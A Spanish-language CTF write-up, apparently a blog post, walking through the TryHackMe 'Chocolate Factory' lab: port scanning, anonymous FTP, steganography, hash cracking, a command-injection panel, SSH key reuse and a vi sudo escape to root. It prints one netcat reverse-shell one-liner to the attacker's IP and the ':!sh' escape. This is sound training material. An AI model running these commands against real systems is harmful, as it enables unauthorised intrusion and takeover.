---
layout: single
title: Chocolate Factory - TryHackMe
excerpt: "Debemos encontrar dos banderas. Donde a partir de un escaneo de puertos pude saber que hay un servicio Web, SSH, FTP y otros desconocidos. Además, gracias a un script de Nmap, logre determinar que el servidor FTP permite conexiones anónimas, logrando acceder a una imagen compartida en el servidor FTP. Luego, utilice la herramienta steghide para extraer un archivo de texto oculto en la imagen. Además, este archivo parecía al archivo /etc/passwd y contenía un hash de un usuario. Luego, cracke el hash con Hashcat, logrando autenticarme en un sitio web vulnerable a Command Inejction, permitiéndome ejecutar una reverse Shell. Luego, para la escalada privilegio horizontal utilicé una clave privada SSH generada por un usuario local, y para la escalada privilegio vertical, el editor de texto vi que podía ejecutarlo con los privilegios del usuario root."
date: 2023-10-11	
classes: wide
header:
  teaser: /assets/images/Chocolate/image002.png
  teaser_home_page: true
  icon: /assets/images/descarga7.webp
categories:
  - TryHackMe
  - ctf
tags:
  - Linux  
  - OpenVPN
  - Nmap
  - SSH
  - RCE
  - Steghide
  - HTTP
  - vi
  - Sudo
  - Hashcat
  - Command Injection
  - Python
  - FTP
---

![](/assets/images/Chocolate/image001.png)

## SUMMARY

Debemos encontrar dos banderas. Donde a partir de un escaneo de puertos pude saber que hay un servicio Web, SSH, FTP y otros desconocidos. Además, gracias a un script de Nmap, logre determinar que el servidor FTP permite conexiones anónimas, logrando acceder a una imagen compartida en el servidor FTP. Luego, utilice la herramienta steghide para extraer un archivo de texto oculto en la imagen. Además, este archivo parecía al archivo /etc/passwd y contenía un hash de un usuario. Luego, cracke el hash con Hashcat, logrando autenticarme en un sitio web vulnerable a Command Inejction, permitiéndome ejecutar una reverse Shell. Luego, para la escalada privilegio horizontal utilicé una clave privada SSH generada por un usuario local, y para la escalada privilegio vertical, el editor de texto vi que podía ejecutarlo con los privilegios del usuario root.

## FASE RECONOCIMIENTO ACTIVO

En este caso debemos acceder al sistema destino y obtener las banderas. Para ello empezaremos utilizando el comando openvpn con el fin de establecer una conexión VPN con la red virtual dónde está la máquina ChocolateFactory. Para ello utilizaremos el archivo de configuración, que lo podemos descargar en la plataforma de Tryhackme, que puede incluir información como la dirección del servidor VPN, los certificados y claves de seguridad, la configuración de encriptación, etc.

![](/assets/images/Chocolate/image003.png)

Luego de que se establece la conexión VPN se crea una interfaz virtual de red en nuestra máquina. Donde se enruta todo el tráfico de red a través de esa interfaz.

![](/assets/images/Chocolate/image004.png)

Además, la plataforma de Tryhackme nos muestra la dirección ip de la máquina ChocolateFactory.

![](/assets/images/Chocolate/image005.png)

## FASE ESCANEO Y ENUMERACION

Luego pasaremos a la fase de Escaneo y Enumeración con el fin de poder escanear los puertos del nodo. Además, obtendremos los servicios que se han levantado en los puertos abiertos, las versiones de los servicios, y el sistema operativo de la máquina Madeye Castle. Para ello utilizaremos `Nmap`. Donde le pasaremos los siguientes parámetros:
- El parámetro -sC o –script=”default” para utilizar todos los scripts de la categoría default con el fin de realizar un escaneo y detección de los puertos de manera avanzada.
- El parámetros -sV con el fin de conocer las versiones de los servicios levantados en los puertos abiertos.
- El parámetro -n para evitar la resolución DNS, y el parámetro –max-rate para indicarle el número máximo de paquetes por segundo que va a utilizar Nmap para el escaneo con el fin de evitar sobrecargar la red con el tráfico generado por la herramienta.
- El parámetro -Pn para evitar que Nmap, que realice ningún tipo de sondeo o ping hacia el sistema destino con el fin de determinar si el host está vivo o activo, y realice el escaneo de puertos directamente.
- El parámetro -p- para realizar un escaneo de los 65535 puertos del nodo y el parámetro –open con el fin de que nos muestre información solo de los puertos abiertos.

![](/assets/images/Chocolate/image006.png)

![](/assets/images/Chocolate/image007.png)

![](/assets/images/Chocolate/image008.png)

![](/assets/images/Chocolate/image009.png)

Los resultados que obtuvimos del escaneo vienen a ser:
- Un programa servidor web Apache levantado en el puerto 80. Además, gracias al script http-tittle podemos saber que hay una pagina web alojado en el directorio raíz del servidor web.
- Un programa servidor SSH levantado en el puerto 22.
- Un programa servidor FTP levantado en el puerto 21, y que permite las conexiones anónimas. Además, gracias a ello podemos observar que la herramienta puedo saber que hay un recurso compartido que viene a ser una imagen.
- Diversos servicios desconocidos levantados en diferentes puertos.

Ahora descargaremos la imagen compartida. Para ello nos conectaremos al servidor FTP mediante una conexión anónima.

![](/assets/images/Chocolate/image010.png)

![](/assets/images/Chocolate/image011.png)

Ahora utilizaremos steghide, que viene a ser una herramienta de esteganografía utilizada para extraer datos ocultos en otros medios, en este caso nuestra imagen.

![](/assets/images/Chocolate/image012.png)

![](/assets/images/Chocolate/image013.png)

![](/assets/images/Chocolate/image014.png)

![](/assets/images/Chocolate/image015.png)

Podemos observar que hay un archivo de texto oculto en la imagen, y logramos extraerlo. Además, su contenido esta codificada en base64, y si lo decodificamos, nos damos con la sorpresa que parecer ser el archivo /etc/passwd del sistema destino. Además, podemos observar el hash del usuario Charlie.

Ahora crackearemos el hash del usuario local Charlie, pero antes debemos identificar el algoritmo hash que está utilizando.

![](/assets/images/Chocolate/image016.png)

![](/assets/images/Chocolate/image017.png)

![](/assets/images/Chocolate/image018.png)

Podemos observar que logramos crackear el hash.

Ahora utilizaremos estas credenciales para acceder al sistema destino mediante el servicio SSH.

![](/assets/images/Chocolate/image019.png)

Podemos observar que las credenciales encontradas anteriormente no vienen a ser credenciales de inicio de sesión.

Ahora accederemos a la página web, que no tiene la etiqueta title, alojada en el directorio raíz del servidor web a través de mi navegador web.

![](/assets/images/Chocolate/image020.png)

![](/assets/images/Chocolate/image021.png)

Podemos observar que se trata de una pagina web con un login o formulario HTML. Además, si utilizamos las credenciales encontradas anteriormente, logramos autenticarnos exitosamente. Además, podemos observar que nos redirige a un panel donde podemos ejecutar comandos en el sistema operativo del sistema destino.

## FASE GANAR ACCESO O EXPLOTACION O HACKING

Ahora utilizaremos el comando `mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.123.194 1500 >/tmp/f` para generar una reverse Shell y comprobaremos si no se ha implementado un filtro al lado del servidor que limite las comandos que pueden ingresar los usuarios.

![](/assets/images/Chocolate/image022.png)

![](/assets/images/Chocolate/image023.png)

Podemos observar que logramos acceder al sistema destino mediante la vulnerabilidad RCE.

Ahora ejecutaremos los siguientes comandos para tener una reverse Shell mas estable e interactiva.

![](/assets/images/Chocolate/image024.png)

## FASE ESCALADA PRIVILEGIOS
Ahora buscaremos vectores de escalada privilegios de manera manual en el sistema de archivos del sistema destino.

![](/assets/images/Chocolate/image025.png)

Podemos observar que el usuario Charlie ha generado una clave privada y publica SSH y no le ha configurado los controles de acceso correcto. Pudiendo nosotros leer su contenido.

Ahora transferiremos la clave privada SSH utilizaremos la clave privada SSH de Charlie para acceder al sistema destino mediante el servicio SSH y siendo el usuario Charlie.

![](/assets/images/Chocolate/image026.png)

![](/assets/images/Chocolate/image027.png)

![](/assets/images/Chocolate/image028.png)

![](/assets/images/Chocolate/image029.png)

De esta manera logramos realizar una escalada privilegio horizontal. Además, encontramos la primera bandera.

Ahora buscaremos otro vector de escalada privilegios para ser un usuario con mayores privilegios. Para ello enumeraremos los comandos y programas que podemos ejecutar con el comando sudo y con privilegios de otros usuarios.

![](/assets/images/Chocolate/image030.png)

![](/assets/images/Chocolate/image031.png)

Podemos observar que el usuario Charlie puede ejecutar el comando vi con los privilegios de cualquier usuario del sistema menos del usuario root. Además, la versión del programa sudo instalado en el sistema destino es 1.8.21. Por lo tanto, ambas condiciones se prestan a la vulnerabilidad CVE-2019-14287.

![](/assets/images/Chocolate/image032.png)

![](/assets/images/Chocolate/image033.png)

Pero si intentemos explotar la vulnerabilidad, nos topamos con mensajes de error y nos da suponer que han parcheado la vulnerabilidad.

Ahora lo mas extraño es que si intentamos ejecutar el comando vi con los privilegios del usuario root, si se nos ejecuta el editor de texto a pesar de que no debería, pero bueno, aprovecharemos el bug. Luego, en la interfaz del editor de texto vi, ejecutamos el comando :!sh para generar una nueva instancia de Shell con los privilegios del usuario root.

![](/assets/images/Chocolate/image034.png)

De esta manera logramos realizar una escalada privilegio vertical.

Ahora debemos encontrar la segunda bandera a partir del script root.py ubicado en el directorio root.

![](/assets/images/Chocolate/image035.png)

- Podemos observar que el script primero va a solicitar que el usuario ingrese una clave, que será almacenada en la variable key.
- Luego, se crea una instancia de la clase Fernet utilizando la clave.
- Luego, esta instancia se le aplicara el método decrypt para desencriptar la clave mediante un mensaje encriptado en Fernet, que este contenido en el mensaje encrypted_mess.
- Luego, se utiliza la función decode para convertir los bytes desencriptados de la clave en una cadena de caracteres, y esto se va a imprimir en pantalla y lo más probable es que sea nuestra bandera.

![](/assets/images/Chocolate/image036.png)

Además, durante la enumeración manual realizada en el sistema archivos siendo el usuario Charlie, nos encontramos con un archivo ejecutable en el directorio raíz del servidor web. Si intentamos ejecutarlo, nos solicitaran ingresar un nombre, pero no logramos acertar con el nombre solicitado.

![](/assets/images/Chocolate/image037.png)

Por lo que utilizamos el comando strings para observar las cadenas de caracteres legibles en el contenido del archivo ejecutable, y nos topamos que el nombre solicitado es laksdhfas, y nos genera una clave.

![](/assets/images/Chocolate/image038.png)

Ahora, si ingresamos la clave en el script Python root, nos generara la segunda bandera.

 

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 



































